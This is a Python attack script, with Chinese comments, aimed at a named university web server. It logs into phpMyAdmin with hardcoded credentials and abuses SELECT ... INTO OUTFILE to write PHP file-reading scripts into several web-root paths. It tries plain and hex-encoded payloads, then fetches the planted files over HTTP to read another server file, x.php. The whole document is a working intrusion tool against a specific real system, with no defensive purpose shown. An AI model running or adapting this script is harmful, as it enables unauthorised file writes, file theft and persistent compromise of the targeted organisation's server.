#!/usr/bin/env python3
import requests
import re
import time
urllib3 = __import__('urllib3')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th/phpmyadmin/"
session = requests.Session()
session.verify = False

# 登录
login_data = {"pma_username": "mysql", "pma_password": "Mu123.123.", "server": "1"}
resp = session.post(url + "index.php", data=login_data, allow_redirects=True)
token = re.search(r'token=([a-f0-9]+)', resp.text).group(1)

target_file = "/var/www/html/banpot/scmeeting/x.php"

# 写入一个读取文件的PHP脚本
read_php = f'<?php echo file_get_contents("{target_file}"); ?>'
read_php_hex = read_php.encode().hex()

# 尝试多个写入位置
write_paths = [
    "/var/www/html/banpot/scmeeting/readx.php",
    "/var/www/html/banpot/scmeeting/tmp.php",
    "/var/www/html/readx.php",
    "/var/www/banpot/scmeeting/readx.php",
]

for write_path in write_paths:
    print(f"[*] 尝试写入: {write_path}")
    
    # 方法1: 直接写入
    sql = f"SELECT '{read_php}' INTO OUTFILE '{write_path}';"
    sql_data = {"sql_query": sql, "db": "scmeeting"}
    resp = session.post(url + "server_sql.php", params={"token": token, "db": "scmeeting"}, data=sql_data)
    
    time.sleep(1)
    
    # 访问写入的文件
    http_path = write_path.replace("/var/www/html", "").replace("/var/www", "")
    test_url = f"https://olympic.su.ac.th{http_path}"
    resp2 = requests.get(test_url, verify=False, timeout=5)
    
    if resp2.status_code == 200 and len(resp2.text) > 10 and '<?php' not in resp2.text:
        print(f"[+] 成功读取文件内容!")
        print("=" * 70)
        print(resp2.text)
        print("=" * 70)
        exit(0)
    elif '<?php' in resp2.text or 'system' in resp2.text.lower():
        print(f"[+] 文件内容:")
        print(resp2.text[:500])

# 方法2: 通过hex编码写入
print("[*] 尝试hex编码写入...")
sql_hex = f"SELECT 0x{read_php_hex} INTO OUTFILE '/var/www/html/banpot/scmeeting/readx.php';"
sql_data = {"sql_query": sql_hex, "db": "scmeeting"}
resp = session.post(url + "server_sql.php", params={"token": token, "db": "scmeeting"}, data=sql_data)
time.sleep(1)
resp2 = requests.get("https://olympic.su.ac.th/banpot/scmeeting/readx.php", verify=False, timeout=5)
if resp2.status_code == 200 and len(resp2.text) > 10:
    print("[+] 成功!")
    print(resp2.text)
    exit(0)

print("[-] 未成功读取文件")
